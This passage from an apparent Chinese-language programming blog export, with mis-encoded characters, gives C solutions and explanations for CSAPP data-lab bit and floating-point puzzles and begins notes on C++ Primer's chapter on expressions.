ç¬¦å·æ•°è¡¨ç¤ºï¼Œå°±åƒï¼šbin(-7)='-0b111</li></ul></li><li>æ­£æ•°ï¼Œéœ€è¦1ä½ç¬¦å·ä½+æ•°å€¼è¡¨ç¤º</li></ul><p>ç°åœ¨éš¾ç‚¹å°±å˜æˆå¦‚ä½•æ±‚high_bitï¼Œå³æ±‚æœ€é«˜ä½çš„1ï¼š</p><p>0010 0000 0000 0000 | <s>0000 0000 0000 0000</s><br><s>0000 0000 0000 0000</s> | 0001 0000 0000 0000</p><p>ä¸Šé¢ç»™å‡º2ä¸ªä¾‹å­ï¼Œé¦–å…ˆçœ‹é«˜16ä½æ˜¯å¦æœ‰1</p><p>è‹¥æœ‰ï¼Œå³ç§»åŠ¨16ä½ï¼Œç»§ç»­å»çœ‹1åœ¨å“ªï¼ˆåœ¨é«˜16ä½ä¸­åŒç†å»æ±‚ï¼‰</p><p>è‹¥æ— ï¼Œåˆ™æ„å‘³ç€é«˜16ä½å…¨ä¸º0ï¼Œä¸éœ€è¦å³ç§»ï¼ˆåœ¨ä½16ä½ä¸­åŒç†ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">howManyBits</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> is_zero = !x;</span><br><span class="line">  <span class="type">int</span> is_neg = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> mask = (!!x) &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  x = (is_neg &amp; ~x) | (~is_neg &amp; x);</span><br><span class="line">  <span class="comment">// 0010 0000 0000 0000 | 0000 0000 0000 0000</span></span><br><span class="line">  <span class="comment">// -------------------            16</span></span><br><span class="line">  <span class="comment">// 0000 0000 0000 0000 | 0001 0000 0000 0000</span></span><br><span class="line">  <span class="comment">//                       -------------------</span></span><br><span class="line">  <span class="type">int</span> bit_16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;  <span class="comment">// 16 0</span></span><br><span class="line">  x &gt;&gt;= bit_16;</span><br><span class="line">  <span class="type">int</span> bit_8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  x &gt;&gt;= bit_8;</span><br><span class="line">  <span class="type">int</span> bit_4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  x &gt;&gt;= bit_4;</span><br><span class="line">  <span class="type">int</span> bit_2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  x &gt;&gt;= bit_2;</span><br><span class="line">  <span class="type">int</span> bit_1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  x &gt;&gt;= bit_1;</span><br><span class="line">  <span class="type">int</span> bit_0 = x;</span><br><span class="line">  <span class="type">int</span> high_bit = <span class="number">1</span> + bit_16 + bit_8 + bit_4 + bit_2 + bit_1 + bit_0;</span><br><span class="line">  <span class="keyword">return</span> is_zero | (mask &amp; high_bit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatScale2">floatScale2</h1><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>F</mi><mo>=</mo><mo stretchy="false">(</mo><mo>âˆ’</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>s</mi></msup><mo>Ã—</mo><mi>M</mi><mo>Ã—</mo><msup><mn>2</mn><mi>E</mi></msup></mrow><annotation encoding="application/x-tex">F = (-1)^s\times M\times 2^{E}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">âˆ’</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">E</span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>å¯¹äºInF/NaNï¼Œç›´æ¥è¾“å‡ºargument</li><li>å¯¹äºéè§„èŒƒæ•°ï¼Œç›´æ¥å°†fracå·¦ç§»1ä½â€”â€”æº¢å‡ºåˆ°expé˜¶ç åŸŸæ²¡å…³ç³»ï¼Œç»“æœä¾ç„¶æ˜¯å¯¹çš„</li><li>å¯¹äºè§„èŒƒæ•°ï¼Œç”±äºEä½äºæŒ‡æ•°ä½ç½®ï¼ŒEç›´æ¥å¢ä¸€å°±è¡Œï¼Œexp = E + biasä¹Ÿæ˜¯å¢ä¸€ã€‚ç”±äºEXPå–å€¼èŒƒå›´ä¸º[1, 254], å¢åŠ åˆ°255ä¹Ÿæ²¡å…³ç³»ï¼ŒINF/NaNéƒ½è¡Œã€‚</li></ul><blockquote><p>ğŸ’¡å¯¹äºDenormalized Valuesï¼Œfracç›´æ¥å·¦ç§»1ä½ï¼Œç§»é™¤åˆ°é˜¶ç åŸŸç»“æœä¹Ÿæ˜¯æ­£ç¡®çš„ã€‚<br>å°¾æ•°åŸŸæœ€é«˜ä½æƒé‡ä¸º1/2ï¼Œ ç§»é™¤åˆ°é˜¶ç åŸŸå˜æˆè§„èŒƒæ•°åï¼ŒM=1+fracï¼Œè¿™æ—¶Eç”±äºè§£é‡Šæ–¹å¼çš„å·®å¼‚å€¼ä¸å˜ï¼Œè€ŒMå¤šçš„è¿™ä¸ª1æ°å¥½æ˜¯1/2çš„2å€ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatScale2</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;  <span class="comment">// æ— ç¬¦å·æ•°ä½¿ç”¨é€»è¾‘å³ç§»</span></span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xFF</span>) &#123;  <span class="comment">// Inf/NaN</span></span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;  <span class="comment">// denormalized number</span></span><br><span class="line">    <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | frac &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;  <span class="comment">// normalized number</span></span><br><span class="line">    ++<span class="built_in">exp</span>;</span><br><span class="line">    <span class="keyword">return</span> sign &lt;&lt; <span class="number">31</span> | <span class="built_in">exp</span> &lt;&lt; <span class="number">23</span> | frac;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatFloat2Int">floatFloat2Int</h1><p>å…ˆæ’é™¤denormalized numberå’Œspeical numberï¼Œå¯¹äºè§„èŒƒæ•°ï¼š</p><p>å…ˆé€šè¿‡E = exp - 127 è®¡ç®—é˜¶ç </p><p>å†é€šè¿‡ <code>|0x800000</code> ï¼ˆ5ä¸ª0ï¼‰æŠŠéšå«çš„1åŠ ä¸Šï¼Œç„¶åæ ¹æ®Eè¿›è¡Œç§»ä½</p><p>æœ€åæ ¹æ®ç¬¦å·ä½ï¼Œçœ‹æ˜¯å¦éœ€è¦åŠ è´Ÿå·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">floatFloat2Int</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">  <span class="type">int</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> <span class="built_in">exp</span> = uf &gt;&gt; <span class="number">23</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">int</span> frac = uf &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xFF</span>) &#123;  <span class="comment">// Inf/NaN</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">exp</span>) &#123;  <span class="comment">// denormalized number</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> E = <span class="built_in">exp</span> - <span class="number">127</span>;</span><br><span class="line">    frac |= <span class="number">0x800000</span>;  <span class="comment">// åé¢æœ‰5ä¸ª0: 20/4=5</span></span><br><span class="line">    <span class="keyword">if</span> (E &gt;= <span class="number">31</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0x80000000</span>u;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (E &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">      frac &lt;&lt;= (E - <span class="number">23</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (E &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">      frac &gt;&gt;= (<span class="number">23</span> - E);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign)  frac = ~frac + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> frac;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="floatPower2">floatPower2</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">floatPower2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">//                        Min                    Max</span></span><br><span class="line">  <span class="comment">// denormalized: 2^(-23)*2^(1-127)=2^(-149)   &lt;2^(-126)</span></span><br><span class="line">  <span class="comment">// normalized:   2^(-126)                     &lt;2^(254-127)*2=2^(128)</span></span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">-126</span>) &#123;</span><br><span class="line"><span class="comment">// denormalized</span></span><br><span class="line">    <span class="comment">// &lt;--------------------------</span></span><br><span class="line">    <span class="comment">// ---&gt; è´Ÿçš„è¶Šå¤šï¼Œå°±éœ€è¦å¾€å³é€€æ›´å¤š</span></span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span> | <span class="number">1</span> &lt;&lt; (<span class="number">23</span> + x + <span class="number">126</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; <span class="number">128</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è®¡ç®—æœºåŸºç¡€ </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬4ç«  è¡¨è¾¾å¼</title>
      <link href="/2023/05/17/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch04/"/>
      <url>/2023/05/17/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch04/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¬¬4ç« -è¡¨è¾¾å¼">ç¬¬4ç«  è¡¨è¾¾å¼</h1><h2 id="è¡¨è¾¾å¼åŸºç¡€">è¡¨è¾¾å¼åŸºç¡€</h2><ul><li><strong>è¿ç®—å¯¹è±¡è½¬æ¢</strong>ï¼šå°æ•´æ•°ç±»å‹ä¼šè¢«æå‡ä¸ºè¾ƒå¤§çš„æ•´æ•°ç±»å‹</li><li><strong>é‡è½½è¿ç®—ç¬¦</strong>ï¼šå½“è¿ç®—ç¬¦ä½œç”¨åœ¨ç±»ç±»å‹çš„è¿ç®—å¯¹è±¡æ—¶ï¼Œç”¨æˆ·å¯ä»¥è‡ªè¡Œå®šä¹‰å…¶å«ä¹‰ã€‚</li><li><strong>å·¦å€¼å’Œå³å€¼</strong>ï¼š<ul><li>Cä¸­åŸæ„ï¼šå·¦å€¼<strong>å¯ä»¥</strong>åœ¨è¡¨è¾¾å¼å·¦è¾¹ï¼Œå³å€¼ä¸èƒ½ã€‚</li><li><code>C++</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«ç”¨ä½œ<strong>å³å€¼</strong>çš„æ—¶å€™ï¼Œç”¨çš„æ˜¯å¯¹è±¡çš„<strong>å€¼</strong>ï¼ˆå†…å®¹ï¼‰ï¼›</li><li>è¢«ç”¨åš<strong>å·¦å€¼</strong>æ—¶ï¼Œç”¨çš„æ˜¯å¯¹è±¡çš„<strong>èº«ä»½</strong>ï¼ˆåœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼‰ã€‚</li></ul></li><li><strong>æ±‚å€¼é¡ºåº</strong>ï¼š<code>int i = f1() + f2()</code><ul><li>å…ˆè®¡ç®—<code>f1() + f2()</code>,å†è®¡ç®—<code>int i = f1() + f2()</code>ã€‚ä½†æ˜¯f1å’Œf2çš„è®¡ç®—<strong>å…ˆåä¸ç¡®å®š</strong></li><li>ä½†æ˜¯ï¼Œå¦‚æœf1ã€f2éƒ½å¯¹åŒä¸€å¯¹è±¡è¿›è¡Œäº†ä¿®æ”¹ï¼Œå› ä¸ºé¡ºåºä¸ç¡®å®šï¼Œæ‰€ä»¥ä¼šç¼–è¯‘å‡ºé”™ï¼Œæ˜¾ç¤ºæœªå®šä¹‰</li></ul></li></ul><h2 id="ç®—æœ¯è¿ç®—ç¬¦">ç®—æœ¯è¿ç®—ç¬¦</h2><ul><li><strong>æº¢å‡º</strong>ï¼šå½“è®¡ç®—çš„ç»“æœè¶…å‡ºè¯¥ç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„èŒƒå›´æ—¶å°±ä¼šäº§ç”Ÿæº¢å‡ºã€‚</li><li><strong>boolç±»å‹ä¸åº”è¯¥å‚ä¸è®¡ç®—</strong><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> b=<span class="literal">true</span>;</span><br><span class="line"><span class="type">bool</span> b2=-b;   <span class="comment">//ä»ç„¶ä¸ºtrue</span></span><br><span class="line"><span class="comment">//bä¸ºtrueï¼Œæå‡ä¸ºå¯¹åº”int=1ï¼Œ-b=-1</span></span><br><span class="line"><span class="comment">//b2=-1â‰ 0ï¼Œæ‰€ä»¥b2ä»æœªtrue</span></span><br></pre></td></tr></table></figure></li><li>å–ä½™è¿ç®—m%nï¼Œç»“æœç¬¦å·ä¸mç›¸åŒ</li></ul><h2 id="é€»è¾‘è¿ç®—ç¬¦">é€»è¾‘è¿ç®—ç¬¦</h2><ul><li><strong>çŸ­è·¯æ±‚å€¼</strong>ï¼šé€»è¾‘ä¸è¿ç®—ç¬¦å’Œé€»è¾‘æˆ–è¿ç®—ç¬¦éƒ½æ˜¯å…ˆæ±‚å·¦ä¾§è¿ç®—å¯¹è±¡çš„å€¼å†æ±‚å³ä¾§è¿ç®—å¯¹è±¡çš„å€¼ï¼Œå½“ä¸”ä»…å½“å·¦ä¾§è¿ç®—å¯¹è±¡æ— æ³•ç¡®å®šè¡¨è¾¾å¼çš„ç»“æœæ—¶æ‰ä¼šè®¡ç®—å³ä¾§è¿ç®—å¯¹è±¡çš„å€¼ã€‚<strong>å…ˆå·¦å†å³</strong></li><li>å°æŠ€å·§ï¼Œå£°æ˜ä¸ºå¼•ç”¨ç±»å‹å¯ä»¥é¿å…å¯¹å…ƒç´ çš„æ‹·è´ï¼Œå¦‚ä¸‹ï¼Œå¦‚stringç‰¹åˆ«å¤§æ—¶å¯ä»¥èŠ‚çœå¤§é‡æ—¶é—´ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; text;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span> &amp;s: text)&#123;</span><br><span class="line">  cout&lt;&lt;s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="èµ‹å€¼è¿ç®—ç¬¦">èµ‹å€¼è¿ç®—ç¬¦</h2><ul><li>èµ‹å€¼è¿ç®—çš„<strong>è¿”å›ç»“æœæ—¶å®ƒçš„å·¦ä¾§è¿ç®—å¯¹è±¡</strong>ï¼Œä¸”æ˜¯ä¸€ä¸ªå·¦å€¼ã€‚ç±»å‹ä¹Ÿå°±æ˜¯å·¦ä¾§å¯¹è±¡çš„ç±»å‹ã€‚</li><li>å¦‚æœèµ‹å€¼è¿ç®—çš„å·¦å³ä¾§è¿ç®—å¯¹è±¡ç±»å‹ä¸åŒï¼Œåˆ™å³ä¾§è¿ç®—å¯¹è±¡å°†è½¬æ¢æˆå·¦ä¾§è¿ç®—å¯¹è±¡çš„ç±»å‹ã€‚</li><li>èµ‹å€¼è¿ç®—ç¬¦æ»¡è¶³<strong>å³ç»“åˆå¾‹</strong>ï¼Œè¿™ç‚¹å’Œå…¶ä»–äºŒå…ƒè¿ç®—ç¬¦ä¸ä¸€æ ·ã€‚ <code>ival = jval = 0;</code>ç­‰ä»·äº<code>ival = (jval = 0);</code></li><li>èµ‹å€¼è¿ç®—ä¼˜å…ˆçº§æ¯”è¾ƒä½ï¼Œä½¿ç”¨å…¶å½“æ¡ä»¶æ—¶åº”è¯¥åŠ æ‹¬å·ã€‚</li><li>å¤åˆèµ‹å€¼è¿ç®—ç¬¦ï¼Œ<strong>å¤åˆè¿ç®—ç¬¦åªæ±‚å€¼ä¸€æ¬¡</strong>ï¼Œæ™®é€šè¿ç®—ç¬¦æ±‚å€¼ä¸¤æ¬¡ã€‚ï¼ˆå¯¹æ€§èƒ½æœ‰ä¸€ç‚¹ç‚¹ç‚¹ç‚¹å½±å“ï¼‰<br>ä»»æ„å¤åˆè¿ç®—ç¬¦opç­‰ä»·äº<code>a = a op b;</code></li></ul><h2 id="é€’å¢é€’å‡è¿ç®—ç¬¦">é€’å¢é€’å‡è¿ç®—ç¬¦</h2><ul><li>å‰ç½®ç‰ˆæœ¬<code>j = ++i</code>ï¼Œå…ˆåŠ ä¸€åèµ‹å€¼</li><li>åç½®ç‰ˆæœ¬<code>j = i++</code>ï¼Œå…ˆèµ‹å€¼ååŠ ä¸€</li></ul><p><strong>ä¼˜å…ˆä½¿ç”¨å‰ç½®</strong>ç‰ˆæœ¬ï¼Œåç½®å¤šä¸€æ­¥å‚¨å­˜åŸå§‹å€¼ã€‚ï¼ˆé™¤ééœ€è¦å˜åŒ–å‰çš„å€¼ï¼‰</p><h3 id="æ··ç”¨è§£å¼•ç”¨å’Œé€’å¢è¿ç®—ç¬¦">æ··ç”¨è§£å¼•ç”¨å’Œé€’å¢è¿ç®—ç¬¦</h3><p><code>*iter++</code>ç­‰ä»·äº<code>*(iter++)</code>ï¼Œé€’å¢ä¼˜å…ˆçº§è¾ƒé«˜</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> iter = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (iter!=vi.<span class="built_in">end</span>()&amp;&amp;*iter&gt;=<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;*iter++&lt;&lt;endl;<span class="comment">// è¾“å‡ºå½“å‰å€¼ï¼ŒæŒ‡é’ˆå‘å‰ç§»1</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>ç®€ä»‹æ˜¯ä¸€ç§ç¾å¾·</strong>ï¼Œè¿½æ±‚ç®€æ´èƒ½é™ä½ç¨‹åºå‡ºé”™å¯èƒ½æ€§</p></blockquote><h2 id="æˆå‘˜è®¿é—®è¿ç®—ç¬¦">æˆå‘˜è®¿é—®è¿ç®—ç¬¦</h2><p><code>ptr-&gt;mem</code>ç­‰ä»·äº<code>(*ptr).mem</code></p><p>æ³¨æ„<code>.</code>è¿ç®—ç¬¦ä¼˜å…ˆçº§å¤§äº<code>*</code>ï¼Œæ‰€ä»¥è®°å¾—åŠ æ‹¬å·</p><h2 id="æ¡ä»¶è¿ç®—ç¬¦">æ¡ä»¶è¿ç®—ç¬¦</h2><ul><li><p>æ¡ä»¶è¿ç®—ç¬¦ï¼ˆ<code>?:</code>ï¼‰å…è®¸æˆ‘ä»¬æŠŠç®€å•çš„<code>if-else</code>é€»è¾‘åµŒå…¥åˆ°å•ä¸ªè¡¨è¾¾å¼ä¸­å»ï¼ŒæŒ‰ç…§å¦‚ä¸‹å½¢å¼ï¼š<code>cond? expr1: expr2</code></p></li><li><p>å¯ä»¥åµŒå¥—ä½¿ç”¨ï¼Œ<strong>å³ç»“åˆå¾‹</strong>ï¼Œä»å³å‘å·¦é¡ºåºç»„åˆ</p><ul><li><pre><code class="language-c++">finalgrade = (grade &gt; 90) ? &quot;high pass&quot;    : (grade &lt; 60) ? &quot;fail&quot; : &quot;pass&quot;;//ç­‰ä»·äºfinalgrade = (grade &gt; 90) ? &quot;high pass&quot;    : ï¼ˆ(grade &lt; 60) ? &quot;fail&quot; : &quot;pass&quot;ï¼‰;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 